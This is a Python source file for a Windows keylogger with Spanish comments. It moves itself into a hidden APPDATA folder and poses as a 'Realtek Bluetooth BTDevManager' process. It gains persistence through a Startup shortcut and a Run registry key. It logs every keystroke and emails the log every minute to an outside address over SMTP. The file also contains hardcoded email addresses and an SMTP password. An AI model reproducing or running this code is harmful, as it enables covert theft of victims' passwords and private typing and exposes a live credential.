import pynput.keyboard
import threading
import os
from datetime import datetime
import sys
import schedule
import time
import requests
import winshell
import shutil
import ctypes
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from PyQt5.QtWidgets import QApplication, QMainWindow
from PyQt5.QtGui import QIcon
import winreg

hora_actual = datetime.now().time()
hora_sin_segundos = hora_actual.strftime('%H:%M')

# Obtener el nombre del ejecutable en tiempo de ejecución
nombre_ejecutable = os.path.splitext(os.path.basename(sys.executable))[0]

# Obtener la ruta del ejecutable correctamente
ruta_ejecutable = os.path.abspath(sys.argv[0])

# Ruta de la carpeta "Microsoft" dentro de "Roaming" y luego "Windows32"
ruta_script = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Client')
if not os.path.exists(ruta_script):
    os.makedirs(ruta_script)

# Utilizar el nombre del ejecutable para formar la nueva ruta de destino
ruta_destino = os.path.join(ruta_script, f'{nombre_ejecutable}.exe')

shutil.move(ruta_ejecutable, ruta_destino)

def ocultar_carpeta(ruta_carpeta):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(ruta_carpeta, 2)
        print(f"Carpeta '{ruta_carpeta}' ocultada con éxito.")
    except Exception as e:
        print(f"Error al ocultar la carpeta: {e}")

ocultar_carpeta(ruta_script)

# Nuevas funciones para crear acceso directo y agregar al registro de inicio

def crear_acceso_directo_startup(nombre_ejecutable, ruta_destino):
    startup_folder = winshell.startup()
    acceso_directo_path = os.path.join(startup_folder, f'{nombre_ejecutable}.lnk')

    try:
        with winshell.shortcut(acceso_directo_path) as shortcut:
            shortcut.path = ruta_destino
            shortcut.write()
        print(f"Acceso directo creado en la carpeta de inicio: {acceso_directo_path}")
    except Exception as e:
        print(f"Error al crear el acceso directo en la carpeta de inicio: {e}")

def agregar_registro_inicio(nombre_ejecutable, ruta_destino):
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = nombre_ejecutable

    try:
        key_handle = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key_handle, value_name, 0, winreg.REG_SZ, ruta_destino)
        winreg.CloseKey(key_handle)
        print(f"Entrada en el registro de inicio agregada correctamente.")
    except Exception as e:
        print(f"Error al agregar la entrada en el registro de inicio: {e}")


# Después de moverse, crear acceso directo en la carpeta de inicio y agregar al registro de inicio
crear_acceso_directo_startup(nombre_ejecutable, ruta_destino)
agregar_registro_inicio(nombre_ejecutable, ruta_destino)

class RealtekBluetoothBTDevManager:
    def __init__(self):
        self.eventos = ""
        self.borrar_count = 0
        self.bloc_mayus_activado = False
        self.mutex = threading.Lock()
        self.iniciar()

    def tecla_usuario(self, tecla):
        try:
            if tecla == pynput.keyboard.Key.caps_lock:
                self.bloc_mayus_activado = not self.bloc_mayus_activado
                self.eventos += "[bloc_mayus_" + ("on]" if self.bloc_mayus_activado else "off]")
            elif tecla == pynput.keyboard.Key.backspace:
                self.borrar_count += 1
            else:
                self.eventos += self.traducir_tecla(tecla, self.bloc_mayus_activado)

        except Exception as e:
            print(f"Error al procesar tecla: {e}")

    def traducir_tecla(self, tecla, mayus_activado):
        if hasattr(tecla, 'char'):
            return str(tecla.char.upper() if mayus_activado else tecla.char)
        nombre_tecla = str(tecla).replace('Key.', '').replace('_', ' ')
        if nombre_tecla == "cmd":
            return "[tecla windows]"
        elif nombre_tecla.startswith("up"):
            return "[flecha arriba]"
        elif nombre_tecla.startswith("down"):
            return "[flecha abajo]"
        elif nombre_tecla.startswith("left"):
            return "[flecha izquierda]"
        elif nombre_tecla.startswith("right"):
            return "[flecha derecha]"
        elif nombre_tecla.startswith("[Shift r]"):
            return "[shift]"
        elif nombre_tecla.startswith("[Alt l]"):
            return "[alt]"
        elif nombre_tecla.startswith("Alt l"):
            return "[alt]"
        else:
            return f"[{nombre_tecla.capitalize()}]"

    def reporte(self):
        try:
            if self.borrar_count > 0:
                self.eventos += f"[borrar x{self.borrar_count}]"
            if self.eventos.strip():
                fecha_hora_actual = datetime.now()
                self.eventos = f"{fecha_hora_actual.strftime('%H:%M')}] {self.eventos}"

                with open(os.path.join(ruta_script, 'registro.txt'), 'a') as archivo:
                    archivo.write(self.eventos + '\n')

        except Exception as e:
            print(f"Error al escribir en el archivo: {e}")

        self.eventos = ""
        self.borrar_count = 0

    def mensaje_inicio(self):
        try:
            hora_inicio = datetime.now().strftime("%Y/%m/%d %H:%M")
            with open(os.path.join(ruta_script, 'registro.txt'), 'a') as archivo:
                archivo.write(
                    f"------------------------------ [Se ha iniciado el programa correctamente ({hora_inicio})] ------------------------------\n"
                    )
        except Exception as e:
            print(f"Error al escribir el mensaje de inicio: {e}")

    def enviar_correo(self):
        try:
            from_email = 'hackeadxputx@hotmail.com'
            to_email = 'mauricioboted@gmail.com'
            subject = 'Informe del Realtek Bluetooth BTDevManager'
            body = 'Adjunto encontrarás el registro de actividades capturadas por el Realtek Bluetooth BTDevManager.'

            mensaje = MIMEMultipart()
            mensaje['From'] = from_email
            mensaje['To'] = to_email
            mensaje['Subject'] = subject
            mensaje.attach(MIMEText(body, 'plain'))

            with open(os.path.join(ruta_script, 'registro.txt'), 'rb') as adjunto:
                adjunto_part = MIMEApplication(adjunto.read(), Name='registro.txt')
                adjunto_part['Content-Disposition'] = f'attachment; filename={os.path.basename("registro.txt")}'
                mensaje.attach(adjunto_part)

            servidor_smtp = smtplib.SMTP('smtp.elasticemail.com', 2525)
            servidor_smtp.starttls()
            servidor_smtp.login(from_email, '9848BB3C62ECE23E142BD9F72211CD95EBF2')  # Reemplaza 'tu_contraseña' con tu contraseña real

            servidor_smtp.sendmail(from_email, to_email, mensaje.as_string())
            servidor_smtp.quit()

            print("Correo enviado con éxito")

        except Exception as e:
            print(f"Error al enviar el correo electrónico: {e}")

    def bucle_envio_correo(self):
        while True:
            time.sleep(60)  # Esperar 60 segundos antes de enviar el próximo correo
            with self.mutex:
                self.enviar_correo()

    def temporizador_reporte(self):
        while True:
            time.sleep(5)
            with self.mutex:
                self.reporte()

    def iniciar_gui(self):
        # Configurar la aplicación y la ventana principal para establecer el ícono
        app = QApplication(sys.argv)
        main_win = QMainWindow()

        # Modifica la siguiente línea con la ruta correcta a tu icono en la carpeta "Descargas"
        icono_path = os.path.join(os.path.expanduser('~'), 'Descargas', 'setting.png')

        main_win.setWindowIcon(QIcon(icono_path))
        main_win.hide()  # Oculta la ventana principal

        # Iniciar la aplicación en un hilo separado
        threading.Thread(target=app.exec_, daemon=True).start()

    def iniciar(self):
        self.mensaje_inicio()

        # Programar el envío periódico de correos electrónicos en un hilo separado
        threading.Thread(target=self.bucle_envio_correo, daemon=True).start()

        self.iniciar_gui()

        with pynput.keyboard.Listener(on_press=self.tecla_usuario) as listener:
            threading.Thread(target=self.temporizador_reporte, daemon=True).start()

            while True:
                time.sleep(1)

# Crear una instancia de RealtekBluetoothBTDevManager
bt_manager = RealtekBluetoothBTDevManager()

# Iniciar el programa
bt_manager.iniciar()
